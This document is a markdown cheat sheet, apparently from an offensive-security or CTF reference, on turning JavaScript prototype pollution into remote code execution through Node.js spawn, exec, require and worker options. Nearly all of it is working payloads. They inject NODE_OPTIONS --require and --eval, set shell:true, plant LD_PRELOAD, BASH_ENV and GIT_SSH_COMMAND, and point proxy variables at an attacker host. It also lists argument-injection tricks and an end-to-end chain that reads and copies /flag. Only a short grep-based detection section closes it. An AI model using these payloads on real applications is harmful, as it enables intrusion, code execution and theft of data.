# Process gadgets — the spawn/env/require path to RCE

Pollution that lands inside spawn/exec/require options turns an
authorization write into command execution. These are the
highest-value sinks after template-compile.

---

## 1. `NODE_OPTIONS` — the flag that requires your file

`child_process.fork`/`spawn` of a node binary reads `env`:

```js
spawn('node', ['-e', 'code'], {env: {...}})
spawn('node', ['script.js'], {env: Object.assign({}, process.env, opts.env)})
```

Polluting `env.NODE_OPTIONS` adds flags to every spawned node:

```json
{"__proto__": {"env": {"NODE_OPTIONS": "--require /tmp/x.js"}}}
{"__proto__": {"env": {"NODE_OPTIONS": "--eval 'require(\"fs\").readFileSync(\"/flag\")'"}}}
{"__proto__": {"env": {"NODE_OPTIONS": "--inspect=0.0.0.0:9229"}}}
```

`--require` is the gadget — Node runs the required file before the
script; the file needs to exist (upload it, write it via another
primitive, or point at a writable path the app already has).

`NODE_OPTIONS` requires the SPAWN to read the polluted `env` — the
spawn that uses `process.env` inherits it when the pollution is on
the prototype the env object was built from.

## 2. `shell`/`execPath`/`execArgv`

```js
spawn(cmd, args, {shell: true})   — cmd runs through a shell
spawn(cmd, args, {execPath: '/path/to/node'})   — which binary runs
spawn(cmd, args, {execArgv: ['--eval', 'CODE']}) — args to the binary
execFile(file, args, {env, cwd, shell})
```

```json
{"__proto__": {"shell": true}}
{"__proto__": {"execPath": "/tmp/node"}}
{"__proto__": {"execArgv": ["--eval", "CODE"]}}
{"__proto__": {"env": {"PATH": "/tmp"}}}
{"__proto__": {"cwd": "/tmp"}}
```

`shell: true` is the injection pivot — `spawn('convert', [file])` with
`shell: true` turns `file` argument characters into shell syntax —
the args become a command line. `execPath`/`execArgv` replace the
binary entirely.

`cwd` + `PATH` are the relative-resolution pair: spawn `tool` from a
`cwd` where your `tool` exists — binary pickup.

## 3. `require`/`import` sinks

```js
require(opts.module)          — module resolution
require(path.join(opts.dir, name))  — join with a polluted root
import(opts.specifier)        — dynamic import
```

```json
{"__proto__": {"module": "/tmp/x"}}
{"__proto__": {"dir": "/tmp"}}
{"__proto__": {"paths": ["/tmp/node_modules"]}}
{"__proto__": {"main": "/tmp/x.js"}}
{"__proto__": {"extensions": {".js": "/tmp/handler"}}}
{"__proto__": {"specifier": "file:///tmp/x.mjs"}}
```

`require` resolution walks `require.paths`/`NODE_PATH` — polluting the
paths list inserts a directory; `main`/`extensions`/`specifier` are
the direct-target variants.

## 4. The `forgot the spawn is exec` shapes

```js
exec(cmd)                        — already a shell; env matters
execFile(file)                   — args may still hit a shell:true fallback
spawn('git', ['clone', opts.url]) — url polluted → argument injection
spawn('rsync', ['-e', opts.ssh]) — ssh command injection
```

Even without `shell: true`, the ARGS can carry the payload when the
tool interprets them (`git clone --upload-pack=CMD`, `rsync -e CMD`,
`tar --checkpoint-action=exec=CMD`, `find -exec CMD`). Pollute the
option that becomes an arg.

## 5. Cluster/worker/thread surfaces

```js
cluster.fork(env)                — fork inherits env
new Worker(script, {workerData, env})   — worker thread env/data
child_process.fork(modulePath, args, {env, execArgv})
```

```json
{"__proto__": {"workerData": {"eval": "CODE"}}}
{"__proto__": {"execArgv": ["--eval","CODE"]}}
{"__proto__": {"modulePath": "/tmp/x.js"}}
```

## 6. The `process.env` pollution path

You don't always need the spawn's `env` option — polluting
`process.env` itself (via `__proto__.env = {...}` on whatever object
`process.env` gets built from, or via a config merge into
`process.env`) adds `NODE_OPTIONS`/`LD_PRELOAD`/`PATH` to the
environment every child inherits:

```json
{"__proto__": {"NODE_OPTIONS": "--require /tmp/x"}}
{"__proto__": {"LD_PRELOAD": "/tmp/x.so"}}
{"__proto__": {"PATH": "/tmp:/usr/bin"}}
{"__proto__": {"PYTHONPATH": "/tmp"}}
{"__proto__": {"PERL5OPT": "-M/tmp/x"}}
{"__proto__": {"RUBYOPT": "-r/tmp/x"}}
{"__proto__": {"BASH_ENV": "/tmp/x"}}
{"__proto__": {"ENV": "/tmp/x"}}
{"__proto__": {"GIT_SSH_COMMAND": "/tmp/x"}}
{"__proto__": {"SSH_ASKPASS": "/tmp/x"}}
{"__proto__": {"EDITOR": "/tmp/x"}}
{"__proto__": {"PAGER": "/tmp/x"}}
{"__proto__": {"VISUAL": "/tmp/x"}}
{"__proto__": {"http_proxy": "http://attacker"}}
{"__proto__": {"https_proxy": "http://attacker"}}
{"__proto__": {"no_proxy": ""}}
```

The env-var injection corpus — each variable is a vector for a
different child process that reads it. `LD_PRELOAD` for any dynamic
binary, `BASH_ENV`/`ENV` for non-interactive shells, `GIT_SSH_COMMAND`
for git-invoking children, `http_proxy` for any http client.

## 7. The `windowsHide`/`detached`/`uid`/`gid` flips

```json
{"__proto__": {"detached": true, "stdio": "ignore"}}
{"__proto__": {"uid": 0, "gid": 0}}
{"__proto__": {"shell": "/bin/sh"}}
{"__proto__": {"argv0": "bash"}}
{"__proto__": {"stdio": ["pipe", "inherit", "inherit"]}}
```

`stdio: "inherit"` leaks the child's stdout to your response on some
harnesses; `detached` keeps the process after the request dies.

## 8. The end-to-end spawn chain (the realistic shape)

```js
// the app
app.post('/render', (req,res)=>{
  const opts = _.merge({}, defaults, req.body.opts);   // ← merge
  spawn('node', ['renderer.js'], {env: opts.env});      // ← sink
});
```

```json
{"opts": {"env": {"NODE_OPTIONS": "--eval 'require(\"fs\").writeFileSync(\"/tmp/o\",require(\"fs\").readFileSync(\"/flag\"))'"}}}
```

The merge pollutes `opts.env` (not even the prototype — the opts
object itself), the spawn inherits, the eval writes the flag where
a second endpoint serves it.

## 9. Detection

```bash
grep -rnE 'spawn|exec|execFile|fork|Worker|require\(' src/ | grep -v node_modules
```

Each call site's option object is a pollution target. The `env`,
`shell`, `execArgv`, `cwd`, `stdio` fields are the names to search.
